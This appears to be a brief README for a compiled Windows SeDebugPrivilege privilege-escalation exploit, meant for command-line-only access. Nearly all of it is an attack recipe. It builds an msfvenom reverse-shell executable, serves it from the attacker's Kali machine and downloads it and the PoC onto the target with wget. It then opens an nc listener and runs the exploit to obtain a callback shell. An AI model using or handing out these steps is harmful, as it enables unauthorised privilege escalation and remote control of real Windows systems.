# SeDebugPrivilege
SeDebugPrivilege compiled exploit

This exploit is when you do not have a GUI on the machine, only CLI. A shell.exe file must be uploaded into the C:\Temp directory

mkdir C:\Temp #on windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP ADDRESS> LPORT=<LISTENING PORT> -f exe > shell.exe #on kali
python3 -m http.server 80 #on kali
wget http://<IP ADDRESS>/shell.exe -o C:\Temp\shell.exe #powershell
wget http://<IP ADDRESS>/SeDebugPrivilegePoC.exe -o C:\Temp\SeDebugPrivilegePoC.exe #powershell
nc -lvnp <LISTENING PORT> #kali
./SeDebugPrivilegePoC.exe

You should recieve a callback from the Windows machine

